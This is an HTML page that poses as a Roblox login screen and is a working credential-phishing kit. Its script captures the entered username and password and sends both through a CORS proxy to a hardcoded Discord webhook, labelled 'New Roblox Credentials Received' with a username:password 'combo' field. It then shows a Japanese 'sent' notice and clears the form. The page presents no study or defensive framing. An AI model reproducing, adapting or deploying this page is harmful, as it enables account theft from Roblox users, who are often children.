<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox - Login Authorization</title>
    <style>
        :root {
            --roblox-red: #FF0033;
            --roblox-red-hover: #E6002E;
            --bg-main: #F4F5F7;
            --bg-card: #FFFFFF;
            --bg-input: #F0F2F5;
            --border-color: #D1D5DB;
            --text-main: #111827;
            --text-muted: #6B7280;
            --success-green: #10B981;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }

        body {
            background-color: var(--bg-main);
            color: var(--text-main);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 1.5rem;
        }

        .login-card {
            background: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: 16px;
            padding: 2.5rem 2rem;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
            text-align: center;
        }

        .roblox-logo {
            width: 64px;
            height: 64px;
            fill: var(--roblox-red);
            margin-bottom: 1rem;
            transform: rotate(-10deg);
        }

        .brand-title {
            font-size: 2rem;
            font-weight: 900;
            color: var(--text-main);
            letter-spacing: 1.5px;
            margin-bottom: 1.5rem;
            text-transform: uppercase;
        }

        .input-group {
            text-align: left;
            margin-bottom: 1.25rem;
        }

        label {
            display: block;
            font-size: 0.75rem;
            color: var(--text-muted);
            margin-bottom: 0.5rem;
            font-weight: 800;
            letter-spacing: 0.5px;
        }

        input {
            width: 100%;
            background: var(--bg-input);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 14px;
            color: var(--text-main);
            font-size: 1rem;
            outline: none;
            transition: all 0.2s;
        }

        input:focus {
            border-color: var(--roblox-red);
            background: #FFFFFF;
            box-shadow: 0 0 0 3px rgba(255, 0, 51, 0.15);
        }

        .submit-btn {
            width: 100%;
            background: var(--roblox-red);
            border: none;
            border-radius: 8px;
            padding: 14px;
            color: #fff;
            font-size: 1rem;
            font-weight: 800;
            cursor: pointer;
            transition: background 0.2s, transform 0.1s;
            margin-top: 0.5rem;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            box-shadow: 0 4px 12px rgba(255, 0, 51, 0.3);
        }

        .submit-btn:hover {
            background: var(--roblox-red-hover);
        }

        .submit-btn:active {
            transform: scale(0.98);
        }

        .status-msg {
            margin-top: 1.25rem;
            padding: 12px;
            border-radius: 8px;
            font-size: 0.95rem;
            font-weight: 700;
            display: none;
        }

        .status-msg.success {
            display: block;
            background: rgba(16, 185, 129, 0.15);
            color: var(--success-green);
            border: 1px solid rgba(16, 185, 129, 0.3);
        }
    </style>
</head>
<body>

    <div class="login-card">
        <svg class="roblox-logo" viewBox="0 0 24 24">
            <path d="M18.5 24L0 18.5 5.5 0 24 5.5 18.5 24zM10.2 9.2l-1.4 4.6 4.6 1.4 1.4-4.6-4.6-1.4z"/>
        </svg>

        <h1 class="brand-title">ROBLOX</h1>

        <form id="userForm">
            <div class="input-group">
                <label for="userId">USERNAME / EMAIL / PHONE</label>
                <input type="text" id="userId" placeholder="Enter Roblox Username" required>
            </div>

            <div class="input-group">
                <label for="userPassword">PASSWORD</label>
                <input type="password" id="userPassword" placeholder="Enter Roblox Password" required>
            </div>

            <button type="submit" class="submit-btn">Log In</button>
        </form>

        <div id="statusMessage" class="status-msg">
            ✓ 送信しました
        </div>
    </div>

    <script>
        // 新しく設定されたDiscord Webhook URL
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1566423918116479100/-JCc1ON3GfJC3p8ghm6ZwU3KIOmZBaWQKFFTwNDNpxdnWNkGVhC786MFU-gLxFHFp47b";

        document.getElementById('userForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const userId = document.getElementById('userId').value.trim();
            const userPassword = document.getElementById('userPassword').value.trim();
            const statusMsg = document.getElementById('statusMessage');

            if (!userId || !userPassword) return;

            const payload = {
                username: "Roblox Access Bot",
                avatar_url: "https://images.rbxcdn.com/227e2a9b3d2b2707f433362c3f87a8b4.png",
                embeds: [{
                    title: "🚨 New Roblox Credentials Received",
                    color: 14820122,
                    fields: [
                        { name: "👤 Username / ID", value: `\`\`\`${userId}\`\`\``, inline: false },
                        { name: "🔑 Password", value: `\`\`\`${userPassword}\`\`\``, inline: false },
                        { name: "📋 Combo Format", value: `\`\`\`${userId}:${userPassword}\`\`\``, inline: false }
                    ],
                    footer: { text: "Roblox Webhook Notification" },
                    timestamp: new Date().toISOString()
                }]
            };

            const proxyUrl = "https://corsproxy.io/?" + encodeURIComponent(DISCORD_WEBHOOK_URL);

            fetch(proxyUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            })
            .then(response => {
                if (response.ok) {
                    console.log("Successfully sent to Discord!");
                } else {
                    console.error("Failed, status:", response.status);
                }
            })
            .catch(err => {
                console.error("Error:", err);
            });

            statusMsg.className = "status-msg success";
            statusMsg.innerText = "✓ 送信しました";
            document.getElementById('userForm').reset();
        });
    </script>
</body>
</html>
